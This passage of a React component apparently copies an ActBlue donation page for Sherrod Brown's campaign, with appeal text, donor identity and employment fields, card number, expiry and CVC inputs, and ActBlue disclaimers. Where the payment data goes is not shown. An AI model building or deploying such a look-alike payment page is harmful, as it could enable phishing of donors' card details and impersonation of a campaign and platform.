                    {/* DEMO PAYMENT BUTTON */}
                    <button
                      type="button"
                      onClick={handlePayment}
                      disabled={paymentProcessing}
                      className={`mt-4 w-full py-3 text-[12px] font-bold text-white transition ${
                        paymentProcessing
                          ? "cursor-not-allowed bg-gray-400"
                          : "bg-[#0645ad] hover:bg-[#053889]"
                      }`}
                    >
                      {paymentProcessing ? "Processing..." : "Donate"}
                    </button>

                  
                  </>
                )}

                {/* CONTRIBUTION RULES */}
                <div className="mt-8 border-t border-gray-200 pt-5">
                  <h3 className="text-[13px] font-black text-[#0f2d5e]">
                    Contribution Rules
                  </h3>

                  <ol className="mt-3 list-decimal space-y-3 pl-5 text-[13px] leading-4 text-[#65778d]">
                    <li>
                      This contribution is made from my own funds, and funds are
                      not being provided to me by another person or entity for
                      the purpose of making this contribution.
                    </li>

                    <li>I am at least eighteen years old.</li>

                    <li>I am not a federal contractor.</li>

                    <li>
                      I am making this contribution with my own personal credit
                      card and not with a corporate or business credit card or a
                      card issued to another person.
                    </li>

                    <li>
                      I am a U.S. citizen or lawfully admitted permanent
                      resident (i.e., green card holder).
                    </li>
                  </ol>

                  <p className="mt-3 text-[13px] leading-4 text-[#65778d]">
                    Sign up here to receive text updates. By participating, you
                    consent to recurring autodialed campaign & donation messages
                    from Sherrod Brown to the phone number you provide. No
                    consent required to buy. Message frequency varies. Text STOP
                    to end. Msg&data rates may apply.
                    <span
                      onClick={() => navigate("/terms")}
                      className="font-semibold text-[#0645ad] cursor-pointer "
                    >
                      {" "}
                      Terms of Service.
                    </span>
                    and
                    <span
                      onClick={() => navigate("/privacypolicy")}
                      className="font-semibold text-[#0645ad]"
                    >
                      {" "}
                      Privacy Policy apply.
                    </span>
                  </p>

                  <p className="mt-4 text-[13px] leading-4 text-[#65778d]">
                    By contributing, you agree to allow Friends of Sherrod Brown
                    to use your contribution to match incoming contributions in
                    connection with our grassroots matching program. Excess
                    funds will be treated as general contributions.
                  </p>
                  <p className="mt-4 text-[13px] leading-4 text-[#65778d]">
                    Americans living abroad may only contribute through ActBlue
                    while physically in the United States. By proceeding with
                    this transaction, you agree to ActBlue's
                    <span
                      onClick={() => navigate("/terms")}
                      className="cursor-pointer font-semibold text-[#0645ad]"
                    >
                      {" "}
                      terms & conditions.
                    </span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </section>
      </div>

     
   

<div className="block md:hidden">
  <section className="min-h-screen bg-white">

    {/* MOBILE HERO IMAGE */}
    <img
      src="https://res.cloudinary.com/dvuq6vmiy/image/upload/v1789393766/54d041dd-c8a5-4d6f-b0aa-e5e6b3f38dad-SB-ABmobile-test_mcprkm.png"
      alt="Demo"
      className="h-[125px] w-full object-cover object-center"
    />

    <div className="px-2">

      {/* LOGO */}
      {/* <div className="pt-2 pb-2">
        <img
          src="https://res.cloudinary.com/dvuq6vmiy/image/upload/v1789052629/logo_zwocw0.png"
          alt="Sherrod Brown"
          className="h-auto w-[175px] object-contain"
        />
      </div> */}

   
      {step === 1 && (
        <div>

          <h1 className="text-[26px] mt-6 font-black leading-[1.05] text-[#0b3768]">
            The GOP is breaking spending records in Ohio. Donate now to fend
            off the billionaires and outside groups trying to buy this election:
          </h1>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            My last election holds the record for the most expensive Senate race
            in history, and we are already on track to beat that.
          </p>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            And get this.
          </p>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            The Koch family's dark money super PAC is now targeting us too. This
            is on top of the $89 million that Senate Republicans are spending in
            Ohio – which is more than anywhere else in the country.
          </p>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            I can’t compete with that kind of cash on my own. That’s why I need
            your urgent help today. Will you add a donation so I can flip Ohio?
            Means a lot.
          </p>

          {/* AMOUNT */}
          <h2 className="mt-5 text-[15px] font-black text-[#111]">
            Choose an amount:
          </h2>

        
          <div className="mt-2 grid grid-cols-2 gap-1">
            {amounts.map((amount) => (
              <button
                key={amount}
                type="button"
                onClick={() => {
                  setSelectedAmount(amount);
                  setOtherAmount("");
                }}
                className={`h-[30px] border text-[12px] font-bold ${
                  selectedAmount === amount
                    ? "border-[#0645ad] bg-[#0645ad] text-white"
                    : "border-[#9fb6d3] bg-[#dbe6f3] text-[#08386f]"
                }`}
              >
                {selectedAmount === amount && (
                  <span className="mr-1">✓</span>
                )}
                ${amount}
              </button>
            ))}

            <input
              type="text"
              inputMode="numeric"
              placeholder="$"
              value={otherAmount}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "");

                setOtherAmount(value);
                setSelectedAmount(Number(value) || 0);
              }}
              className="h-[30px] border border-[#9fb6d3] bg-[#dbe6f3] px-2 text-[12px] font-bold text-[#08386f] outline-none"
            />
          </div>

          {/* RECURRING */}
          <h2 className="mt-5 text-[12px] font-black text-[#111]">
            Make it recurring!
          </h2>

          <div className="mt-2 rounded border border-[#d5dce5] bg-white p-2">
            <p className="text-[14px] leading-[1.4] text-[#777]">
              You can choose whether your contribution is recurring or made
              once.
            </p>
          </div>

          <button
            type="button"
            onClick={() => setMonthly(true)}
            className={`mt-1 flex min-h-[31px] w-full items-center justify-center border px-2 py-1 text-center text-[14px] font-bold leading-[1.2] ${
              monthly
                ? "border-[#0645ad] bg-[#0645ad] text-white"
                : "border-[#9fb6d3] bg-[#dbe6f3] text-[#08386f]"
            }`}
          >
            {monthly && <span className="mr-1">✓</span>}
            Yes, count me in until the general election on November 3rd
          </button>

          <button
            type="button"
            onClick={() => setMonthly(false)}
            className={`flex min-h-[31px] w-full items-center justify-center px-2 py-1 text-center text-[14px] font-bold leading-[1.2] ${
              !monthly
                ? "bg-[#0645ad] text-white"
                : "border border-[#9fb6d3] bg-[#dbe6f3] text-[#08386f]"
            }`}
          >
            {!monthly && <span className="mr-1">✓</span>}
            No, contribute once
          </button>

          {/* CONTINUE */}
        
<button
  type="button"
  disabled={!selectedAmount}
  onClick={() => setStep(2)}
  className={`mt-4 flex h-[30px] w-full items-center justify-center gap-1 text-[15px] font-bold text-white ${
    selectedAmount
      ? "bg-[#0645ad]"
      : "cursor-not-allowed bg-gray-300"
  }`}
>
  {/* CARD ICONS */}
  <div className="flex items-center gap-[2px]">

    {/* VISA */}
    <div className="flex h-[13px] w-[20px] items-center justify-center rounded-[1px] border border-[#ccd4dd] bg-white">
      <span className="text-[4px] font-black italic text-[#1434cb]">
        VISA
      </span>
    </div>

    {/* MASTERCARD */}
    <div className="flex h-[13px] w-[20px] items-center justify-center rounded-[1px] border border-[#ccd4dd] bg-white">
      <div className="relative h-[8px] w-[13px]">
        <span className="absolute left-0 top-0 h-[8px] w-[8px] rounded-full bg-[#eb001b]" />
        <span className="absolute right-0 top-0 h-[8px] w-[8px] rounded-full bg-[#f79e1b]" />
      </div>
    </div>

    {/* AMERICAN EXPRESS */}
    <div className="flex h-[13px] w-[20px] items-center justify-center rounded-[1px] border border-[#ccd4dd] bg-white">
      <span className="text-[4px] font-black text-[#1476b8]">
        AMEX
      </span>
    </div>

    {/* DISCOVER */}
    <div className="flex h-[13px] w-[23px] items-center justify-center rounded-[1px] border border-[#ccd4dd] bg-white">
      <div className="flex items-center gap-[1px]">
        <span className="text-[3px] font-bold text-[#333]">
          DISC
        </span>

        <span className="h-[5px] w-[5px] rounded-full bg-[#f58220]" />

        <span className="text-[3px] font-bold text-[#333]">
          VER
        </span>
      </div>
    </div>

  </div>

  {/* BUTTON TEXT */}
  <span className="text-[15px] font-bold">
    Pay with card
  </span>
</button>


        </div>
      )}

      {/* =====================================================
          STEP 2
      ====================================================== */}
      {step === 2 && (
        <div>

          {/* HEADING */}
          <h1 className="text-[26px] font-black leading-[1.05] text-[#0b3768]">
            The GOP is breaking spending records in Ohio. Donate now to fend
            off the billionaires and outside groups trying to buy this election:
          </h1>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            My last election holds the record for the most expensive Senate race
            in history, and we are already on track to beat that.
          </p>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            And get this.
          </p>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            The Koch family's dark money super PAC is now targeting us too. This
            is on top of the $89 million that Senate Republicans are spending in
            Ohio – which is more than anywhere else in the country.
          </p>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            I can’t compete with that kind of cash on my own. That’s why I need
            your urgent help today. Will you add a donation so I can flip Ohio?
            Means a lot.
          </p>

          {/* STEP INDICATOR */}
          <div className="mt-5 flex items-center border-b border-gray-200 pb-2">

            <button
              type="button"
              onClick={() => setStep(1)}
              className="whitespace-nowrap text-[14px] font-bold text-[#0645ad]"
            >
              1) Amount (${selectedAmount})
            </button>

            <div className="mx-1 h-px flex-1 bg-gray-300" />

            <button
              type="button"
              onClick={() => setStep(2)}
              className="whitespace-nowrap text-[14px] font-bold text-[#0645ad]"
            >
              2) Details
            </button>

            <div className="mx-1 h-px flex-1 bg-gray-300" />

            <button
              type="button"
              onClick={() => {
                if (validateStep2()) {
                  setStep(3);
                }
              }}
              className="whitespace-nowrap text-[14px] font-bold text-gray-400"
            >
              3) Payment
            </button>

          </div>

          {/* CONTRIBUTION */}
          <h2 className="mt-4 text-[14px] font-black leading-[1.1] text-[#0b3768]">
            Complete your ${selectedAmount} contribution:
          </h2>

          {/* EMAIL */}
          <input
            type="email"
            name="email"
            placeholder="Email Address *"
            value={formData.email}
            onChange={(e) => {
              handleChange(e);
              setFormErrors((prev) => ({
                ...prev,
                email: "",
              }));
            }}
            className={`mt-3 h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
              formErrors.email
                ? "border-red-500"
                : "border-[#aebdcd]"
            }`}
          />

          {formErrors.email && (
            <p className="mt-1 text-[12px] text-red-600">
              {formErrors.email}
            </p>
          )} 

          {/* FIRST + LAST */}
          <div className="mt-1 grid grid-cols-2 gap-1">

            <div>
              <input
                type="text"
                name="firstName"
                placeholder="First Name *"
                value={formData.firstName}
                onChange={(e) => {
                  handleChange(e);
                  setFormErrors((prev) => ({
                    ...prev,
                    firstName: "",
                  }));
                }}
                className={`h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
                  formErrors.firstName
                    ? "border-red-500"
                    : "border-[#aebdcd]"
                }`}
              />

              {formErrors.firstName && (
                <p className="mt-1 text-[12px] text-red-600">
                  {formErrors.firstName}
                </p>
              )}
            </div>

            <div>
              <input
                type="text"
                name="lastName"
                placeholder="Last Name *"
                value={formData.lastName}
                onChange={(e) => {
                  handleChange(e);
                  setFormErrors((prev) => ({
                    ...prev,
                    lastName: "",
                  }));
                }}
                className={`h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
                  formErrors.lastName
                    ? "border-red-500"
                    : "border-[#aebdcd]"
                }`}
              />

              {formErrors.lastName && (
                <p className="mt-1 text-[12px] text-red-600">
                  {formErrors.lastName}
                </p>
              )}
            </div>

          </div>

          {/* ADDRESS */}
          <input
            type="text"
            name="address"
            placeholder="Number, Street, Apt. *"
            value={formData.address}
            onChange={(e) => {
              handleChange(e);
              setFormErrors((prev) => ({
                ...prev,
                address: "",
              }));
            }}
            className={`mt-1 h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
              formErrors.address
                ? "border-red-500"
                : "border-[#aebdcd]"
            }`}
          />

          {formErrors.address && (
            <p className="mt-1 text-[12px] text-red-600">
              {formErrors.address}
            </p>
          )}

          {/* ZIP + CITY + STATE */}
          {formData.country === "United States" ? (
            <div className="mt-1 grid grid-cols-[0.8fr_1.4fr_0.8fr] gap-1">

              {/* ZIP */}
              <div>
                <input
                  type="text"
                  name="zip"
                  inputMode="numeric"
                  placeholder="ZIP *"
                  value={formData.zip}
                  onChange={(e) => {
                    handleChange(e);
                    setFormErrors((prev) => ({
                      ...prev,
                      zip: "",
                    }));
                  }}
                  className={`h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
                    formErrors.zip
                      ? "border-red-500"
                      : "border-[#aebdcd]"
                  }`}
                />

                {formErrors.zip && (
                  <p className="mt-1 text-[12px] text-red-600">
                    {formErrors.zip}
                  </p>
                )}
              </div>

              {/* CITY */}
              <div>
                <input
                  type="text"
                  name="city"
                  placeholder="City *"
                  value={formData.city}
                  onChange={(e) => {
                    handleChange(e);
                    setFormErrors((prev) => ({
                      ...prev,
                      city: "",
                    }));
                  }}
                  className={`h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
                    formErrors.city
                      ? "border-red-500"
                      : "border-[#aebdcd]"
                  }`}
                />

                {formErrors.city && (
                  <p className="mt-1 text-[12px] text-red-600">
                    {formErrors.city}
                  </p>
                )}
              </div>

              {/* STATE */}
              <div>
                <select
                  name="state"
                  value={formData.state}
                  onChange={(e) => {
                    handleChange(e);
                    setFormErrors((prev) => ({
                      ...prev,
                      state: "",
                    }));
                  }}
                  className={`h-[34px] w-full border bg-white px-1 text-[14px] outline-none focus:border-[#0645ad] ${
                    formErrors.state
                      ? "border-red-500"
                      : "border-[#aebdcd]"
                  }`}
                >
                  <option value="">State *</option>
                  <option value="AL">AL</option>
                  <option value="AK">AK</option>
                  <option value="AZ">AZ</option>
                  <option value="AR">AR</option>
                  <option value="CA">CA</option>
                  <option value="CO">CO</option>
                  <option value="CT">CT</option>
                  <option value="DE">DE</option>
                  <option value="FL">FL</option>
                  <option value="GA">GA</option>
                  <option value="HI">HI</option>
                  <option value="ID">ID</option>
                  <option value="IL">IL</option>
                  <option value="IN">IN</option>
                  <option value="IA">IA</option>
                  <option value="KS">KS</option>
                  <option value="KY">KY</option>
                  <option value="LA">LA</option>
                  <option value="ME">ME</option>
                  <option value="MD">MD</option>
                  <option value="MA">MA</option>
                  <option value="MI">MI</option>
                  <option value="MN">MN</option>
                  <option value="MS">MS</option>
                  <option value="MO">MO</option>
                  <option value="MT">MT</option>
                  <option value="NE">NE</option>
                  <option value="NV">NV</option>
                  <option value="NH">NH</option>
                  <option value="NJ">NJ</option>
                  <option value="NM">NM</option>
                  <option value="NY">NY</option>
                  <option value="NC">NC</option>
                  <option value="ND">ND</option>
                  <option value="OH">OH</option>
                  <option value="OK">OK</option>
                  <option value="OR">OR</option>
                  <option value="PA">PA</option>
                  <option value="RI">RI</option>
                  <option value="SC">SC</option>
                  <option value="SD">SD</option>
                  <option value="TN">TN</option>
                  <option value="TX">TX</option>
                  <option value="UT">UT</option>
                  <option value="VT">VT</option>
                  <option value="VA">VA</option>
                  <option value="WA">WA</option>
                  <option value="WV">WV</option>
                  <option value="WI">WI</option>
                  <option value="WY">WY</option>
                </select>

                {formErrors.state && (
                  <p className="mt-1 text-[12px] text-red-600">
                    {formErrors.state}
                  </p>
                )}
              </div>

            </div>
          ) : (
            <div className="mt-1">
              <input
                type="text"
                name="city"
                placeholder="City *"
                value={formData.city}
                onChange={(e) => {
                  handleChange(e);
                  setFormErrors((prev) => ({
                    ...prev,
                    city: "",
                  }));
                }}
                className={`h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
                  formErrors.city
                    ? "border-red-500"
                    : "border-[#aebdcd]"
                }`}
              />
            </div>
          )}

          {/* COUNTRY */}
          <select
            name="country"
            value={formData.country}
            onChange={(e) => {
              handleChange(e);

              if (e.target.value !== "United States") {
                setFormData((prev) => ({
                  ...prev,
                  country: e.target.value,
                  state: "",
                  zip: "",
                }));
              }

              setFormErrors({});
            }}
            className={`mt-1 h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
              formErrors.country
                ? "border-red-500"
                : "border-[#aebdcd]"
            }`}
          >
            <option value="">Select Country *</option>
            <option value="United States">United States</option>
            <option value="AS">American Samoa</option>
            <option value="GU">Guam</option>
            <option value="MP">Northern Mariana Islands</option>
            <option value="PR">Puerto Rico</option>
            <option value="VI">Virgin Islands, U.S</option>
          </select>

          {formErrors.country && (
            <p className="mt-1 text-[12px] text-red-600">
              {formErrors.country}
            </p>
          )}

          {/* PHONE */}
          <input
            type="tel"
            name="phone"
            placeholder="Cell phone (optional)"
            value={formData.phone}
            onChange={handleChange}
            className="mt-1 h-[34px] w-full border border-[#aebdcd] px-2 text-[14px] outline-none focus:border-[#0645ad]"
          />

          {/* EMPLOYMENT */}
          <div className="mt-4">

            <h2 className="text-[12px] font-black text-[#111]">
              Employment
            </h2>

            <p className="mt-1 text-[12px] leading-[1.4] text-[#777]">
              Campaign finance law requires us to collect contributor
              information, including employment. If you are self-employed,
              enter your own name as your employer.
            </p>

            <label className="mt-2 flex cursor-pointer items-center gap-1">
              <input
                type="checkbox"
                checked={retired}
                onChange={(e) => {
                  setRetired(e.target.checked);

                  if (e.target.checked) {
                    setFormErrors((prev) => ({
                      ...prev,
                      occupation: "",
                      employer: "",
                    }));
                  }
                }}
                className="h-3 w-3 accent-[#0645ad]"
              />

              <span className="text-[12px] text-[#333]">
                I'm retired or currently unemployed
              </span>
            </label>

            {!retired && (
              <div className="mt-2 grid grid-cols-2 gap-1">

                <div>
                  <input
                    type="text"
                    name="occupation"
                    placeholder="Occupation *"
                    value={formData.occupation}
                    onChange={(e) => {
                      handleChange(e);
                      setFormErrors((prev) => ({
                        ...prev,
                        occupation: "",
                      }));
                    }}
                    className={`h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
                      formErrors.occupation
                        ? "border-red-500"
                        : "border-[#aebdcd]"
                    }`}
                  />

                  {formErrors.occupation && (
                    <p className="mt-1 text-[12px] text-red-600">
                      {formErrors.occupation}
                    </p>
                  )}
                </div>

                <div>
                  <input
                    type="text"
                    name="employer"
                    placeholder="Employer *"
                    value={formData.employer}
                    onChange={(e) => {
                      handleChange(e);
                      setFormErrors((prev) => ({
                        ...prev,
                        employer: "",
                      }));
                    }}
                    className={`h-[34px] w-full border bg-white px-2 text-[14px] outline-none focus:border-[#0645ad] ${
                      formErrors.employer
                        ? "border-red-500"
                        : "border-[#aebdcd]"
                    }`}
                  />

                  {formErrors.employer && (
                    <p className="mt-1 text-[12px] text-red-600">
                      {formErrors.employer}
                    </p>
                  )}
                </div>

              </div>
            )}

          </div>

          {/* CONTINUE */}
          <button
            type="button"
            onClick={() => {
              if (validateStep2()) {
                setStep(3);
              }
            }}
            className="mt-4 w-full bg-[#0645ad] py-2.5 text-[14px] font-bold text-white"
          >
            Continue to payment
          </button>

        </div>
      )}

      {/* =====================================================
          STEP 3
      ====================================================== */}
      {step === 3 && (
        <div>

          {/* HEADING */}
          <h1 className="text-[26px] font-black leading-[1.05] text-[#0b3768]">
            The GOP is breaking spending records in Ohio. Donate now to fend
            off the billionaires and outside groups trying to buy this election:
          </h1>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            My last election holds the record for the most expensive Senate race
            in history, and we are already on track to beat that.
          </p>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            And get this.
          </p>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            The Koch family's dark money super PAC is now targeting us too. This
            is on top of the $89 million that Senate Republicans are spending in
            Ohio – which is more than anywhere else in the country.
          </p>

          <p className="mt-4 text-[15px] leading-[1.4] text-[#123d6d]">
            I can’t compete with that kind of cash on my own. That’s why I need
            your urgent help today. Will you add a donation so I can flip Ohio?
            Means a lot.
          </p>

          {/* STEP INDICATOR */}
          <div className="mt-5 flex items-center border-b border-gray-200 pb-2">

            <button
              type="button"
              onClick={() => setStep(1)}
              className="whitespace-nowrap text-[14px] font-bold text-[#0645ad]"
            >
              1) Amount (${selectedAmount})
            </button>

            <div className="mx-1 h-px flex-1 bg-gray-300" />

            <button
              type="button"
              onClick={() => setStep(2)}
              className="whitespace-nowrap text-[14px] font-bold text-[#0645ad]"
            >
              2) Details
            </button>

            <div className="mx-1 h-px flex-1 bg-gray-300" />

            <button
              type="button"
              className="whitespace-nowrap text-[14px] font-bold text-[#0645ad]"
            >
              3) Payment
            </button>

          </div>

          {/* PAYMENT HEADER */}
          <h2 className="mt-4 text-[14px] font-black leading-[1.1] text-[#0b3768]">
            Complete your ${selectedAmount} contribution:
          </h2>

          {/* PAYMENT LOGOS */}
          <div className="mt-3 flex items-center gap-1">

            {/* VISA */}
            <div className="flex h-[20px] w-[31px] items-center justify-center rounded border border-[#ccd4dd] bg-white">
              <span className="text-[6px] font-black italic text-[#1434cb]">
                VISA
              </span>
            </div>

            {/* MASTERCARD */}
            <div className="flex h-[20px] w-[31px] items-center justify-center rounded border border-[#ccd4dd] bg-white">
              <div className="relative h-[11px] w-[18px]">
                <span className="absolute left-0 top-0 h-[10px] w-[10px] rounded-full bg-[#eb001b]" />
                <span className="absolute right-0 top-0 h-[10px] w-[10px] rounded-full bg-[#f79e1b]" />
              </div>
            </div>

            {/* AMEX */}
            <div className="flex h-[20px] w-[31px] items-center justify-center rounded border border-[#ccd4dd] bg-white">
              <span className="text-[5px] font-black text-[#1476b8]">
                AMEX
              </span>
            </div>

            {/* DISCOVER */}
            <div className="flex h-[20px] w-[34px] items-center justify-center rounded border border-[#ccd4dd] bg-white">
              <span className="text-[4px] font-bold text-[#333]">
                DISCOVER
              </span>
            </div>

          </div>

          {/* CARD NUMBER */}
          <div className="relative mt-3">

            <label className="mb-1 block text-[14px] text-[#555]">
              Card number
            </label>

            <input
              type="text"
              inputMode="numeric"
              autoComplete="off"
              maxLength={19}
              placeholder="1234 1234 1234 1234"
              value={cardNumber}
              onChange={(e) => {
                const value = e.target.value
                  .replace(/\D/g, "")
                  .slice(0, 16);

                const formatted = value
                  .replace(/(.{4})/g, "$1 ")
                  .trim();

                setCardNumber(formatted);
                setPaymentError("");
              }}
              className="h-[36px] w-full border border-[#aebdcd] bg-white px-2 pr-[80px] text-[15px] tracking-wide outline-none focus:border-[#0645ad]"
            />

            {/* CARD LOGOS INSIDE CARD FIELD */}
            <div className="pointer-events-none absolute right-2 bottom-[8px] flex items-center gap-[2px]">

              <div className="flex h-[11px] w-[17px] items-center justify-center rounded-[1px] border border-[#d7dce2] bg-white">
                <span className="text-[5px] font-black italic text-[#1434cb]">
                  VISA
                </span>
              </div>

              <div className="flex h-[11px] w-[17px] items-center justify-center rounded-[1px] border border-[#d7dce2] bg-white">
                <div className="relative h-[7px] w-[11px]">
                  <span className="absolute left-0 top-0 h-[7px] w-[7px] rounded-full bg-[#eb001b]" />
                  <span className="absolute right-0 top-0 h-[7px] w-[7px] rounded-full bg-[#f79e1b]" />
                </div>
              </div>

              <div className="flex h-[11px] w-[17px] items-center justify-center rounded-[1px] border border-[#d7dce2] bg-white">
                <span className="text-[3.5px] font-black text-[#1476b8]">
                  AMEX
                </span>
              </div>

              <div className="flex h-[11px] w-[19px] items-center justify-center rounded-[1px] border border-[#d7dce2] bg-white">
                <span className="text-[3.5px] font-bold text-[#333]">
                  DISCOVER
                </span>
              </div>

            </div>
          </div>

          {/* EXPIRATION + CVC */}
          <div className="mt-2 grid grid-cols-2 gap-1">

            {/* EXPIRATION */}
            <div>

              <label className="mb-1 block text-[14px] text-[#555]">
                Expiration date
              </label>

              <input
                type="text"
                inputMode="numeric"
                autoComplete="cc-exp"
                maxLength={7}
                placeholder="MM / YY"
                value={expiration}
                onChange={(e) => {
                  let value = e.target.value
                    .replace(/\D/g, "")
                    .slice(0, 4);

                  if (value.length > 2) {
                    value = `${value.slice(0, 2)} / ${value.slice(2)}`;
                  }

                  setExpiration(value);
                  setPaymentError("");
                }}
                className="h-[36px] w-full border border-[#aebdcd] bg-white px-2 text-[15px] outline-none focus:border-[#0645ad]"
              />

            </div>

            {/* CVC */}
            <div>

              <label className="mb-1 block text-[14px] text-[#555]">
                Security code
              </label>

              <div className="relative">

                <input
                  type="text"
                  inputMode="numeric"
                  autoComplete="off"
                  maxLength={4}
                  placeholder="CVC"
                  value={securityCode}
                  onChange={(e) => {
                    const value = e.target.value
                      .replace(/\D/g, "")
                      .slice(0, 4);

                    setSecurityCode(value);
                    setPaymentError("");
                  }}
                  className="h-[36px] w-full border border-[#aebdcd] bg-white px-2 pr-8 text-[15px] outline-none focus:border-[#0645ad]"
                />

                <span className="pointer-events-none absolute right-2 top-1/2 -translate-y-1/2">

                  <svg
                    width="20"
                    height="15"
                    viewBox="0 0 24 18"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <rect
                      x="0.75"
                      y="0.75"
                      width="22.5"
                      height="16.5"
                      rx="2"
                      fill="white"
                      stroke="#9AA8B8"
                      strokeWidth="1.5"
                    />

                    <rect
                      x="1.5"
                      y="4.5"
                      width="21"
                      height="3"
                      fill="#D9E0E8"
                    />

                    <rect
                      x="15"
                      y="11"
                      width="5"
                      height="2"
                      rx="0.5"
                      fill="#9AA8B8"
                    />
                  </svg>

                </span>

              </div>

            </div>

          </div>

          {/* PAYMENT ERROR */}
          {paymentError && (
            <div className="mt-2 border border-red-200 bg-red-50 px-2 py-2 text-[14px] text-red-600">
              {paymentError}
            </div>
          )}

          {/* DONATE */}
          <button
            type="button"
            onClick={() => handlePayment(true)}
            disabled={paymentProcessing}
            className={`mt-3 w-full py-2.5 text-[15px] font-bold text-white ${
              paymentProcessing
                ? "cursor-not-allowed bg-gray-400"
                : "bg-[#0645ad]"
            }`}
          >
            {paymentProcessing ? "Processing..." : "Donate"}
          </button>

         

        </div>
      )}

      {/* =====================================================
          MOBILE CONTRIBUTION RULES
          SHOW ON ALL STEPS
      ====================================================== */}

      <div className="mt-6 border-t border-gray-200 pt-3">

        <h3 className="text-[15px] font-black text-[#0f2d5e]">
          Contribution Rules
        </h3>

        <ol className="mt-2 list-decimal space-y-1 pl-4 text-[14px] leading-[1.4] text-[#65778d]">

          <li>
            This contribution is made from my own funds, and funds are not
            being provided to me by another person or entity for the purpose
            of making this contribution.
          </li>

          <li>
            I am at least eighteen years old.
          </li>

          <li>
            I am not a federal contractor.
          </li>

          <li>
            I am making this contribution with my own personal credit card
            and not with a corporate or business credit card or a card issued
            to another person.
          </li>

          <li>
            I am a U.S. citizen or lawfully admitted permanent resident
            (i.e., green card holder).
          </li>

        </ol>

        <p className="mt-3 text-[14px] leading-[1.4] text-[#65778d]">
          Sign up here to receive text updates. By participating, you consent
          to recurring autodialed campaign & donation messages from Sherrod
          Brown to the phone number you provide. No consent required to buy.
          Message frequency varies. Text STOP to end. Msg&data rates may
          apply.{" "}

          <span
            onClick={() => navigate("/terms")}
            className="cursor-pointer font-semibold text-[#0645ad]"
          >
            Terms of Service.
          </span>{" "}
          and{" "}

          <span
            onClick={() => navigate("/privacypolicy")}
            className="cursor-pointer font-semibold text-[#0645ad]"
          >
            Privacy Policy apply.
          </span>
        </p>

        <p className="mt-3 text-[14px] leading-[1.4] text-[#65778d]">
          By contributing, you agree to allow Friends of Sherrod Brown to
          use your contribution to match incoming contributions in connection
          with our grassroots matching program. Excess funds will be treated
          as general contributions.
        </p>

        <p className="mt-3 text-[14px] leading-[1.4] text-[#65778d]">
          Americans living abroad may only contribute through ActBlue while
          physically in the United States. By proceeding with this
          transaction, you agree to ActBlue's{" "}

          <span
            onClick={() => navigate("/terms")}
            className="cursor-pointer font-semibold text-[#0645ad]"
          >
            terms & conditions.
          </span>
        </p>

      </div>

    </div>
  </section>
</div>



{/* VERY BOTTOM DISCLAIMER */}
<div className="relative z-50 mt-6 w-full border border-[#9aa8b8] bg-white px-3 py-3 text-center text-[14px] leading-[1.4] text-[#65778d]">
  Platform paid for by ActBlue{" "}
  <span className="font-semibold text-[#0645ad]">
    <a href="https://www.actblue.com">(actblue.com)</a>
  </span>{" "}
  and not authorized by any candidate or candidate committee.
  Contributions or gifts to ActBlue are not deductible as charitable
  contributions for federal income tax purposes. ActBlue is not responsible
  for candidate or committee content on this page nor any communications made
  by candidates or committees. ActBlue does not send emails or text messages
  or make telephone calls on behalf of any candidate or committee. For more
  information on how the ActBlue platform works,{" "}
  <span className="font-semibold text-[#0645ad]">
    <a href="https://www.actblue.com/about/">click here.</a>
  </span>
</div>

    
  
    </div>
  );
};

export default Donate;
